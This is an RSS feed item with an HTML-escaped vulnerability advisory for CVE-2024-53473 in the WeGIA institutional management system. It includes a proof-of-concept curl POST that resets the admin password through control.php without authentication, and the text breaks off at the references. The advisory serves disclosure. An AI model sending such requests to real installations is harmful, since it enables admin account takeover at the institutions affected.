item.description:
&lt;h2 id=&#34;cve-2024-53473-broken-access-control&#34;&gt;CVE-2024-53473: Broken Access Control
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;CVE Publication: &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-53473&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cve.org/CVERecord?id=CVE-2024-53473&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;vendor&#34;&gt;Vendor
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt; WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions. &lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.wegia.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.wegia.org&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://sol.sbc.org.br/index.php/latinoware/article/view/31544&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://sol.sbc.org.br/index.php/latinoware/article/view/31544&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;affected-product-code-base&#34;&gt;Affected Product Code Base
&lt;/h2&gt;&lt;p&gt;WeGIA &amp;lt; v3.2.0&lt;/p&gt;
&lt;h2 id=&#34;vulnerability-description&#34;&gt;Vulnerability Description
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;A critical vulnerability was identified in the web application WeGIa. This vulnerability allows an attacker to change the password of the admin user by sending a POST request to the &lt;code&gt;control.php&lt;/code&gt; endpoint without requiring authentication or authorization.&lt;/p&gt;

item.content:encoded:
&lt;h2 id=&#34;cve-2024-53473-broken-access-control&#34;&gt;CVE-2024-53473: Broken Access Control
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;CVE Publication: &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-53473&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cve.org/CVERecord?id=CVE-2024-53473&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;vendor&#34;&gt;Vendor
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt; WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions. &lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.wegia.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.wegia.org&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://sol.sbc.org.br/index.php/latinoware/article/view/31544&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://sol.sbc.org.br/index.php/latinoware/article/view/31544&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;affected-product-code-base&#34;&gt;Affected Product Code Base
&lt;/h2&gt;&lt;p&gt;WeGIA &amp;lt; v3.2.0&lt;/p&gt;
&lt;h2 id=&#34;vulnerability-description&#34;&gt;Vulnerability Description
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;A critical vulnerability was identified in the web application WeGIa. This vulnerability allows an attacker to change the password of the admin user by sending a POST request to the &lt;code&gt;control.php&lt;/code&gt; endpoint without requiring authentication or authorization.&lt;/p&gt;
&lt;h2 id=&#34;poc&#34;&gt;POC
&lt;/h2&gt;&lt;h3 id=&#34;burp-request&#34;&gt;Burp Request:
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://github.com/user-attachments/assets/56fe1fdc-30c2-4cd3-9e30-ffc826f9f13b&#34;



	loading=&#34;lazy&#34;

		alt=&#34;image&#34;


 /&gt;&lt;/p&gt;
&lt;h3 id=&#34;curl-request&#34;&gt;Curl Request:
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;curl -X POST https://demo.wegia.org/controle/control.php \
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  -H &amp;#34;Content-Type: application/x-www-form-urlencoded&amp;#34; \
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  -H &amp;#34;Origin: https://demo.wegia.org&amp;#34; \
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  --data-raw &amp;#34;nova_senha=1234567&amp;amp;confirmar_senha=1234567&amp;amp;nomeClasse=FuncionarioControle&amp;amp;metodo=alterarSenha&amp;amp;redir=logout.php&amp;amp;id_pessoa=1&amp;amp;alterar=Alterar&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;references&#34;&gt;References
&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/nilsonLazarin/WeGIA/issues/791&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
